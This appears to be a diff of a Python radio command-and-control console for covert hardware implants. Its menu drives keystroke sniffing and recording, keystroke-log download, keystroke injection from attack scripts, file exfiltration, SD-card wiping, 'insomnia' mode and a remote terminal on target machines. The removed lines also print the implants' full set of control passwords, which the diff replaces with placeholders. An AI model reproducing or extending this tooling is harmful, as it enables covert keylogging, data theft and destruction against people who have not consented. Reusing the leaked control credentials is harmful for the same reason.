@@ -1,51 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-#setup the host computer via https://xbplib.readthedocs.io/en/latest/getting_started_with_xbee_python_library.html
-#Currently the Digi Python Library only works with Python v3.8.x, Python 3.9.x will not handle the libraries correctly
-
-#uses blessed module (python -m pip install blessed)
-#https://blessed.readthedocs.io/en/latest/intro.html#requirements
-
-#password for establishing communication back from implants = fOci0a25-x#p-u3?
-#password to check the status of insomnia and key recording modes = YLwuhlTHEh1q7Ha!
-#password for keystroke tx = ce8hovfvemu@ap*B+H3s
-#password for Disable keystrokes = ce8hovevemu@ap*B+H3s
-#password for Enable insomnia = jorLwabocUqeq6bRof$2
-#password for Disable insomnia = jorLwbbocUqeq6bRof$2
-#password for Enable Recording = GatIQEMaNodE5L#p$T?l
-#password for Disable Recording = GatlQEMaNodE5L#p$T?l
-#The following passwords do not need a disable as they are not latching on the Arduino side.
-#password for Enabling wipe = 4+aJu2+6ATRES+ef_OtR
-#password for Enabling key injection = c01h2*+dIp?W3lpez*T=
-#password for data exfil = s$en*zET0aYozE!l-Tu0
-#password for injection script transfer = Jas?8jl2i2=p!aw#
-#password for deleting a file on the implant = mUrex$4retru?lPi
-#password for reset all toggles = 5ec#?#l@1cRA9efe
-#password for downloading keystroke record = suHafU8i@=&ruxl$
-#password for prompting SD card readout = wEsLf9OZlsw$crLV
-
-#---To Do ---  
-#[ ] ability to delete directory as well?   
-#[ ] add status bar for file transfer?
-#[ ] touch up the terminal interface so the cursor ends on the terminal line from fed from the implant?
-#[ ] launch a non-interactive terminal to display keystrokes instead of in the normal prompt
-#[ ] parse data to show readable keystrokes
-#[ ] add function to receive readout of all scripts on the SD card
- 
-#---New additions 4/27/21---
-#made the keystroke injection function more robust to handle errors, no available scripts, and feedback on the success of the script
-#added try/catch function to getModes to handle errors
-#currently working on submenu_send_file to transmit file for storage on SD card.  need to test on arduino side now
-#add a reset mode to reset all toggles in arduino implant
-#add a mode for deleting an individual file on the SD card
-
-#---This version---
-#removing the disable keystroke transmission option as it is automated when exiting out of the rx screen
-#adding function to relay back the recorded keystroke script to the C2
-#reorganizing the menu numbers to reflect the deleted option and the newly added one
-#added file recording for live keystrokes along with start sniffing and end of sniffing time stamps
-#added directory creation on SD card if the correct directory is missing prior to file creation
+#Copyright 2022 Jonathan Fischer and Jeremy Miller
+#Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+#The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 
 import time, os, base64, gzip, io
 import serial.tools.list_ports
@@ -78,15 +37,14 @@ def scanner(t, d):
     try:
         xnet = d.get_network()
         print("\nInitiating scanner.  Please wait for 10 seconds.\n")
-        #xnet.set_discovery_options({DiscoveryOptions.APPEND_DD, DiscoveryOptions.APPEND_RSSI})
-        #set discovery time for 10 seconds
+
         xnet.set_discovery_timeout(10)  
         xnet.start_discovery_process()
         while xnet.is_discovery_running():
             time.sleep(0.5)
-        # Get a list of the devices added to the network.
+
         device_list = xnet.get_devices()
-        #print devices to file
+
         if path.exists('attackNodes.txt'):
             os.remove('attackNodes.txt')
         f = open('attackNodes.txt', 'w')
@@ -343,7 +301,6 @@ def submenu_sniff(d, t, m_enable, m_disable):
         #go into listening mode to receive keystrokes
         target_rx(d, target)
         #disable transmission of keystrokes
-        #password for Disable keystrokes = ce8hovevemu@ap*B+H3s
         target_tx(d,target, m_disable)
         myFile.write("Ending of recording: " + time.asctime(time.localtime(time.time())))
         myFile.close()
@@ -419,7 +376,7 @@ def submenu_rx_file(d,p):
                     break
         except (KeyboardInterrupt, Exception) as e:
             print(e)
-            target_tx(d, t, "s$en*zET0aYozE!l-Tu2")
+            target_tx(d, t, "<<EXFIL_OFF_PASSWORD>>")
             print("User either stopped the process or there was an error.")
             print(e)
             break
@@ -440,13 +397,11 @@ def submenu_send_file(d,p):
         #send script name to write
         target_tx(d, t, name)
         time.sleep(1.0)
-        # New code here for parsing file and sending each line over 
         f = open(filepath, 'r')
         lines = f.readlines()
         for line in lines:
             sendLine = line.strip()
             target_tx(d, t, sendLine)
-            #add code to split lines if over 73 chars
             time.sleep(1.0)
         time.sleep(2.0)
         target_tx(d, t, "EOF")
@@ -495,7 +450,6 @@ def terminal(d, p):
                             target_tx(d,t,userin)
                             y=y+1
                             x=0
-                            #print(term.move_xy(x,y) + "Transmitting: " + userin)
                             y = y+1
                             userin = ""
                         elif inp.name == "KEY_ESCAPE":
@@ -513,7 +467,7 @@ def terminal(d, p):
                         x = x+1
     except (Exception, KeyboardInterrupt) as e:
         print(e)
-        target_tx(d, t, "dF2Gh@34G@#ga80!")
+        target_tx(d, t, "<<TERMINAL_OFF_PASSWORD>>")
                     
 def submenu_getModes(d, p):
     try:
@@ -535,9 +489,6 @@ def submenu_getModes(d, p):
 
                 
 def submenu_fileSelect(d, p, o):   
-#password for injection is c01h2*+dIp?W3lpez*T=  
-#password for downloading the key record file = suHafU8i@=&ruxl$
-#o = option for whether or not to rx a file in and save it, "rx" will save a file to the targetName_keys.txt
     try:
         t = target_menu()
         name = t
@@ -681,54 +632,53 @@ def loop():
         elif option == '2':
             scanner(localtime, device)
         elif option == '3':
-            #password for activating implant functions = fOci0a25-x#p-u3?
-            submenu_toggle(device, "Activate all implants", "Activate target implant", "fOci0a25-x#p-u3?")
+            #password for activating implant functions
+            submenu_toggle(device, "Activate all implants", "Activate target implant", "<<ACTIVATE_PASSWORD>>")
         elif option == '4':
-            #password for retrieving the status of insomnia and key recorder modes = YLwuhlTHEh1q7Ha!
-            submenu_getModes(device, "YLwuhlTHEh1q7Ha!")
+            #password for retrieving the status of insomnia and key recorder modes
+            submenu_getModes(device, "<<STATUS_PASSWORD>>")
         elif option == '5':
-            #password for keystroke tx = ce8hovfvemu@ap*B+H3s
-            submenu_sniff(device, localtime, "ce8hovfvemu@ap*B+H3s", "ce8hovevemu@ap*B+H3s")
+            #password for keystroke tx
+            submenu_sniff(device, localtime, "<<TX1_PASSWORD>>", "<<TX2_PASSWORD>>")
         elif option == '6':
-            #password for Enable insomnia = jorLwabocUqeq6bRof$2
-            submenu_toggle(device, "Cause global insomnia", "Cause targeted insomnia", "jorLwabocUqeq6bRof$2")
+            #password for Enable insomnia
+            submenu_toggle(device, "Cause global insomnia", "Cause targeted insomnia", "<<INSOMNIA_PASSWORD>>")
         elif option == '7':
-            #password for Disable insomnia = jorLwbbocUqeq6bRof$2
-            submenu_toggle(device, "Cure global insomnia", "Cure targeted insomnia", "jorLwbbocUqeq6bRof$2")
+            #password for Disable insomnia
+            submenu_toggle(device, "Cure global insomnia", "Cure targeted insomnia", "<<DISABLE_INSOMNIA_PASSWORD>>")
         elif option == '8':
-            #password for Enable Recording = GatIQEMaNodE5L#p$T?l
-            submenu_toggle(device, "Record keystrokes on all devices", "Record keystrokes on target device", "GatIQEMaNodE5L#p$T?l")
+            #password for Enable Recording
+            submenu_toggle(device, "Record keystrokes on all devices", "Record keystrokes on target device", "<<RECORDING_PASSWORD>>")
         elif option == '9':
-            #password for Disable Recording = GatlQEMaNodE5L#p$T?l
-            submenu_toggle(device, "Disable recording on all devices", "Disable recording on target", "GatlQEMaNodE5L#p$T?l")
+            #password for Disable Recording
+            submenu_toggle(device, "Disable recording on all devices", "Disable recording on target", "<<DISABLE_RECORDING_PASSWORD>>")
         elif option == '10':
             #password for downloading keystroke record file
-            submenu_fileSelect(device, "suHafU8i@=&ruxl$","rx");
+            submenu_fileSelect(device, "<<DOWNLOAD_KEYSTROKE_PASSWORD>>","rx");
         elif option == '11':
-            #password for Enabling wipe = 4+aJu2+6ATRES+ef_OtR
-            submenu_toggle(device, "Wipe all SD Cards", "Wipe SD Card at target address", "4+aJu2+6ATRES+ef_OtR")
+            #password for Enabling wipe
+            submenu_toggle(device, "Wipe all SD Cards", "Wipe SD Card at target address", "<<WIPESD_PASSWORD>>")
         elif option == '12':
-            #password to retrieve file list from target = wEsLf9OZlsw$crLV
-            listFiles(device, "wEsLf9OZlsw$crLV")    
+            #password to retrieve file list from target
+            listFiles(device, "<<GET_SD_PASSWORD>>")    
         elif option == '13':
-            #password for data exfil = s$en*zET0aYozE!l-Tu0
-            #submenu_rx_file(device, "s$en*zET0aYozE!l-Tu0", "yes")
-            submenu_rx_file(device, "s$en*zET0aYozE!l-Tu0")
+            #password for data exfil
+            submenu_rx_file(device, "<<EXFIL_PASSWORD>>")
         elif option == '14':
-            #password for Enabling key injection = c01h2*+dIp?W3lpez*T=
-            submenu_fileSelect(device, "c01h2*+dIp?W3lpez*T=", "no")
+            #password for Enabling key injection
+            submenu_fileSelect(device, "<<KEY_INJECTION_PASSWORD>>", "no")
         elif option == '15':
-            #password for transferring over an attack script = Jas?8jl2i2=p!aw#
-            submenu_send_file(device, "Jas?8jl2i2=p!aw#")
+            #password for transferring over an attack script
+            submenu_send_file(device, "<<SEND_INJECT_PASSWORD>>")
         elif option == '16':
             print("turning on terminal!")
-            terminal(device, "dF2Gh@34G@#ga79!")
+            terminal(device, "<<TERMINAL_PASSWORD>>")
         elif option == '17':
-            #password for deleting a file from SD card = mUrex$4retru?lPi
-            submenu_fileSelect(device, "mUrex$4retru?lPi","delete")
+            #password for deleting a file from SD card
+            submenu_fileSelect(device, "<<DELETE_FILE_PASSWORD>>","delete")
         elif option == '18':
-            #password for resetting all toggle variables in implant = 5ec#?#l@1cRA9efe
-            submenu_toggle(device, "Reset all devices", "Reset target device", "5ec#?#l@1cRA9efe")
+            #password for resetting all toggle variables in implant
+            submenu_toggle(device, "Reset all devices", "Reset target device", "<<RESET_IMPLANT>>")
         elif option == '19':
             device.close()
             exit()
